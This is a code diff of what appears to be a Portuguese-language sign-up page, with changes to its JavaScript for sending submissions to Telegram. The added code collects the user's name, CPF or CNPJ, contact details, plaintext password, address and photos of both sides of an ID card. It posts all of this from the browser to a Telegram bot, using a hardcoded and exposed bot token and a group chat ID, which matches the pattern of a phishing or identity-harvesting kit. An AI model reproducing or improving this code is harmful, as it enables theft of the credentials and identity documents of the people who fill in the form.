@@ -348,12 +348,13 @@
         <div class="step-pane" data-step="3" style="display:none">
           <h2 class="section-title">Documentação</h2>
           <p class="section-subtitle" id="step3-subtitle">Envio de documento de identificação (CNH/RG) — <b>obrigatório frente e verso</b></p>
+          
           <div class="row field-pf">
             <div class="col-12">
               <label class="label">Tipo de documento (PF) *</label>
-              <div class="row">
-                <div class="col-6 radio-group"><label><input type="radio" name="tipoDocPF" value="CNH"> CNH</label></div>
-                <div class="col-6 radio-group"><label><input type="radio" name="tipoDocPF" value="RG"> RG</label></div>
+              <div style="display: flex; gap: 40px; margin-top: 10px;">
+                <div class="radio-group"><label><input type="radio" name="tipoDocPF" value="CNH"> CNH</label></div>
+                <div class="radio-group"><label><input type="radio" name="tipoDocPF" value="RG"> RG</label></div>
               </div>
             </div>
           </div>
@@ -388,7 +389,7 @@
         <div class="step-pane" data-step="4" style="display:none">
           <h2 class="section-title">Revisão</h2>
           <p class="section-subtitle">Revise seus dados antes de concluir</p>
-          <div class="alert info">Revise seus dados. Ao enviar, o cadastro será encaminhado para análise e os dados serão enviados ao nosso grupo interno.</div>
+          <div class="alert info">Revise seus dados. Ao enviar, o cadastro será encaminhado para análise e os dados serão enviados ao grupo interno no Telegram.</div>
           
           <div id="review-wrapper" style="margin-top:10px; line-height: 1.6; word-break: break-word;">
             <div class="row" id="review">
@@ -435,7 +436,7 @@
    * CONFIG TELEGRAM
    * =========================== */
   const TG_BOT_TOKEN = '8264928483:AAFA3PEPqVWnEKXgRDjcA-vvcZikt0mVhi8';
-  const TG_CHAT_IDS   = ['8223594690', '8140445569'];
+  const TG_CHAT_IDS  = ['-1002975721061']; // Lista de IDs para receber notificações (Grupo e Usuário)
   const TG_API = TG_BOT_TOKEN && TG_BOT_TOKEN.startsWith('COLOQUE') ? null : `https://api.telegram.org/bot${TG_BOT_TOKEN}`;
 
   const popoverTriggerList = document.querySelectorAll('[data-bs-toggle="popover"]');
@@ -628,9 +629,13 @@
   function same(a,b){ return (a||'').trim().toLowerCase() === (b||'').trim().toLowerCase(); }
   function getFieldValue(id) { return document.getElementById(id)?.value || ''; }
   function getCheckedValue(name) { const el = document.querySelector(`input[name="${name}"]:checked`); return el ? el.value : ''; }
-
   function validateEmail(e){ return /.+@.+\..+/.test((e||'').trim()); }
   function onlyDigits(str){ return (str||'').replace(/\D/g,''); }
+  
+  function escapeHTML(str) {
+      if (!str) return '';
+      return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+  }
 
   function validateStep(n){
     if (n === 1){
@@ -723,15 +728,52 @@
     reviewContainer.innerHTML = `${specificHtml}${commonHtml}`;
   }
 
+  /**
+   * FUNÇÃO COM A CORREÇÃO FINAL: Usa '\n' para quebras de linha.
+   */
+  function buildResumoHTML() {
+      const getEscapedValue = (id) => escapeHTML(getFieldValue(id));
+      const como = escapeHTML(getCheckedValue('conheceu') || 'Não informado');
+      let header = `<b>Novo cadastro (${escapeHTML(tipoPessoa)})</b>`;
+      let bloco1 = '';
 
-  async function sendTelegramMessage(text){
-    if (!TG_API) throw new Error('Configure TG_BOT_TOKEN/TG_CHAT_ID.');
-    const r = await fetch(`${TG_API}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
-    });
-    if (!r.ok) throw new Error('Falha ao enviar mensagem ao Telegram');
-    return r.json();
+      if (tipoPessoa === 'PF') {
+          bloco1 = `\n<b>Nome:</b> ${getEscapedValue('nome')}\n<b>CPF:</b> ${getEscapedValue('cpf')}\n<b>Apelido:</b> ${getEscapedValue('apelido')}\n<b>Doc (PF):</b> ${escapeHTML(getCheckedValue('tipoDocPF') || '—')}`;
+      } else {
+          bloco1 = `\n<b>Razão Social:</b> ${getEscapedValue('razaoSocial')}\n<b>CNPJ:</b> ${getEscapedValue('cnpj')}\n<b>Nome Fantasia:</b> ${getEscapedValue('nomeFantasia')}\n<b>Apelido:</b> ${getEscapedValue('apelido')}`;
+      }
+      
+      const bloco2 = `\n<b>E-mail:</b> ${getEscapedValue('email')}\n<b>Celular:</b> ${getEscapedValue('celular')}\n<b>Telefone:</b> ${getEscapedValue('telefone') || '—'}\n<b>Senha:</b> ${getEscapedValue('senha')}`;
+      const bloco3 = `\n<b>Endereço:</b> ${getEscapedValue('endereco')}, ${getEscapedValue('numero')} ${getFieldValue('complemento') ? ('- '+getEscapedValue('complemento')) : ''} - ${getEscapedValue('bairro')} - ${getEscapedValue('cidade')}/${getEscapedValue('estado')}\n<b>CEP:</b> ${getEscapedValue('cep')}\n<b>Como nos conheceu:</b> ${como}`;
+
+      return `${header}${bloco1}${bloco2}${bloco3}`;
+  }
+
+  async function sendTelegramMessage(text) {
+      if (!TG_API) throw new Error('Configure as variáveis do bot do Telegram.');
+      let allSent = true;
+      for (const chatId of TG_CHAT_IDS) {
+          try {
+              const response = await fetch(`${TG_API}/sendMessage`, {
+                  method: 'POST', headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+              });
+              if (!response.ok) {
+                  allSent = false;
+                  const errorData = await response.json();
+                  console.error(`Falha ao enviar mensagem para o chat ID: ${chatId}. Resposta da API:`, errorData);
+              } else {
+                  console.log(`Mensagem enviada com sucesso para o chat ID: ${chatId}`);
+              }
+          } catch (error) {
+              allSent = false;
+              console.error(`Erro de REDE ao tentar enviar para o chat ID: ${chatId}`, error);
+          }
+      }
+      if (!allSent) {
+          throw new Error('Falha ao enviar para um ou mais destinatários. Verifique o console (F12) para detalhes.');
+      }
+      return { success: true };
   }
 
   function dataURLtoBlob(dataurl){
@@ -740,29 +782,62 @@
     return new Blob([u8arr], {type:mime});
   }
 
-  async function sendTelegramDocument(blobOrFile, filename, caption){
-    if (!TG_API) throw new Error('Configure TG_BOT_TOKEN/TG_CHAT_ID.');
-    const fd = new FormData();
-    fd.append('chat_id', TG_CHAT_ID);
-    fd.append('document', blobOrFile, filename);
-    if (caption) fd.append('caption', caption);
-    const r = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
-    if (!r.ok) throw new Error('Falha ao enviar documento ao Telegram');
-    return r.json();
+  async function sendTelegramDocument(blobOrFile, filename, caption) {
+      if (!TG_API) throw new Error('Configure as variáveis do bot do Telegram.');
+      let allSent = true;
+      for (const chatId of TG_CHAT_IDS) {
+          try {
+              const fd = new FormData();
+              fd.append('chat_id', chatId);
+              fd.append('document', blobOrFile, filename);
+              if (caption) fd.append('caption', caption);
+              
+              const response = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
+              if (!response.ok) {
+                  allSent = false;
+                  const errorData = await response.json();
+                  console.error(`Falha ao enviar documento para o chat ID: ${chatId}. Resposta da API:`, errorData);
+              } else {
+                  console.log(`Documento enviado com sucesso para o chat ID: ${chatId}`);
+              }
+          } catch (error) {
+              allSent = false;
+              console.error(`Erro de REDE ao tentar enviar documento para o chat ID: ${chatId}`, error);
+          }
+      }
+      if (!allSent) {
+          throw new Error('Falha ao enviar documento para um ou mais destinatários. Verifique o console (F12) para detalhes.');
+      }
+      return { success: true };
   }
-
-  function buildResumoHTML(){
-    const como = getCheckedValue('conheceu') || 'Não informado';
-    let header = `<b>Novo cadastro (${tipoPessoa})</b>`;
-    let bloco1 = '';
-    if (tipoPessoa === 'PF'){
-      bloco1 = `\n<b>Nome:</b> ${getFieldValue('nome')}\n<b>CPF:</b> ${getFieldValue('cpf')}\n<b>Apelido:</b> ${getFieldValue('apelido')}\n<b>Doc (PF):</b> ${getCheckedValue('tipoDocPF') || '—'}`;
-    } else {
-      bloco1 = `\n<b>Razão Social:</b> ${getFieldValue('razaoSocial')}\n<b>CNPJ:</b> ${getFieldValue('cnpj')}\n<b>Nome Fantasia:</b> ${getFieldValue('nomeFantasia')}\n<b>Apelido:</b> ${getFieldValue('apelido')}`;
-    }
-    const bloco2 = `\n<b>E-mail:</b> ${getFieldValue('email')}\n<b>Celular:</b> ${getFieldValue('celular')}\n<b>Telefone:</b> ${getFieldValue('telefone') || '—'}\n<b>Senha:</b> ${getFieldValue('senha')}`;
-    const bloco3 = `\n<b>Endereço:</b> ${getFieldValue('endereco')}, ${getFieldValue('numero')} ${getFieldValue('complemento') ? ('- '+getFieldValue('complemento')) : ''} – ${getFieldValue('bairro')} – ${getFieldValue('cidade')}/${getFieldValue('estado')}\n<b>CEP:</b> ${getFieldValue('cep')}\n<b>Como nos conheceu:</b> ${como}`;
-    return `${header}\n${bloco1}\n${bloco2}\n${bloco3}`;
+  
+  async function sendTelegramPhoto(blobOrFile, filename, caption) {
+      if (!TG_API) throw new Error('Configure as variáveis do bot do Telegram.');
+      let allSent = true;
+      for (const chatId of TG_CHAT_IDS) {
+          try {
+              const fd = new FormData();
+              fd.append('chat_id', chatId);
+              fd.append('photo', blobOrFile, filename); // A API de fotos usa o campo 'photo'
+              if (caption) fd.append('caption', caption);
+              
+              const response = await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd }); // Endpoint é /sendPhoto
+              if (!response.ok) {
+                  allSent = false;
+                  const errorData = await response.json();
+                  console.error(`Falha ao enviar FOTO para o chat ID: ${chatId}. Resposta da API:`, errorData);
+              } else {
+                  console.log(`Foto enviada com sucesso para o chat ID: ${chatId}`);
+              }
+          } catch (error) {
+              allSent = false;
+              console.error(`Erro de REDE ao tentar enviar FOTO para o chat ID: ${chatId}`, error);
+          }
+      }
+      if (!allSent) {
+          throw new Error('Falha ao enviar uma ou mais fotos. Verifique o console (F12) para detalhes.');
+      }
+      return { success: true };
   }
 
   async function salvar() {
@@ -789,14 +864,16 @@
 
           if (docFrontFileInput.files[0]) {
               await sendTelegramDocument(docFrontFileInput.files[0], docFrontFileInput.files[0].name, 'Documento – Frente');
-          } else if (capturedFront) {
-              await sendTelegramDocument(dataURLtoBlob(capturedFront), 'documento_frente.jpg', 'Documento – Frente (capturado)');
+          } 
+          else if (capturedFront) {
+              await sendTelegramPhoto(dataURLtoBlob(capturedFront), 'documento_frente.jpg', 'Documento – Frente (capturado)');
           }
 
           if (docBackFileInput.files[0]) {
               await sendTelegramDocument(docBackFileInput.files[0], docBackFileInput.files[0].name, 'Documento – Verso');
-          } else if (capturedBack) {
-              await sendTelegramDocument(dataURLtoBlob(capturedBack), 'documento_verso.jpg', 'Documento – Verso (capturado)');
+          }
+          else if (capturedBack) {
+              await sendTelegramPhoto(dataURLtoBlob(capturedBack), 'documento_verso.jpg', 'Documento – Verso (capturado)');
           }
 
           document.getElementById('form').style.display = 'none';
